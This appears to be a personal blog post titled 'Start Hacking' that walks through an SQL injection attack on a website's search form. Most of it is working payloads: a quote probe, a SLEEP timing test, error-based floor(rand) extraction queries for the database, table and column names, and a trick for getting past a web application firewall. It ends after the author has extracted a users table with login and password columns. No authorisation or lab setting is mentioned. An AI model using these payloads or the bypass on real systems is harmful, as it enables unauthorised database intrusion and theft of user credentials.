---
layout: post
title: Start Hacking
---

1. First to check of course is search form.
url: /search/?'
We get Result:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version.
Whoua! This query is vulnerable to SQL Injection. Now we must to determine type of injection.

2.  Adding always true statement
url: search/?' or '1'='1
We get bad result: Subquery returns more than 1 row. It means that our query is inside another one possible ne Where clause. For Example 
Select * From Orders Where field = (Select field from order_fields)
It means that our injection is Blind, we can’t see result and because we see errors from sql queries it means that we have error-based blind sql injection.

3. To be sure we are in right way, GO TO SLEEP.
url: search/?1' OR (SELECT SLEEP(3)) or '1'='1
Please be quite our server is sleeping.

There are some well known tactics to work in this situation, googling will give us this well-know samples. We just add some modifications to fit our request. 
4.  Let’s try to get current database name in hex.
url: search/?1' or(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,Hex(cast(database() as char)),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1
Not Acceptable, 406 ! This is bad, first thing that coming to mind is we have WAF and he is blocking max_get_size. But simplifying query doesn’t get result. After some research I found out that WAF is blocking ‘information_schema.tables’ combination in url….
It was sad, but after 1-2 hours of researching I found out that there is bypassing way of this restriction, here is: “information_schema 0.e.tables”



5. After getting database namem we need to get table names from information_schema.

Getting Table Results
url: 1' or(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,Hex(cast(table_name as char)),0x27,0x7e) FROM information_schema 0.e.tables Where table_schema=0xDATABASE_NAME_IN_HEX limit 1,1)) from information_schema 0.e.tables limit 0,1),floor(rand(0)*2))x from information_schema 0.e.tables group by x)a) and '1'='1
Click-Method show us that they have 95 tables, after retrieving them one and one we found interesting ones:
tt_users, tt_admin_lists
6. Let’s start from tt_admin_lists. ( We need to get column names, then by table name and column name get value again one by one )
Getting Column Names:
url: 1' or(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,Hex(cast(column_name as char)),0x27,0x7e) FROM information_schema 0.e.columns  Where table_schema=0xDATABASE_NAME_IN_ HEX AND table_name=0xTABLE_NAME_IN_HEX limit 1,1)) from information_schema 0.e.tables limit 0,1),floor(rand(0)*2))x from information_schema 0.e.tables group by x)a) and '1'='1
admin _id, admin_login, admin_password

Getting column data:
url: 1' or(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,Hex(cast(tt_admin_lists.admin_login as char)),0x27,0x7e) FROM `DATABASE_NAME`. tt_admin_lists LIMIT 1,1) ) from information_schema 0.e.tables limit 0,1),floor(rand(0)*2))x from information_schema 0.e.tables group by x)a) and '1'='1
Unfortunately this table was blank.

7. After that we do same steps for tt_users table and get result.
Column Names:
User, pass, type, name
And 5 users.

8. HASH HACKING STEP
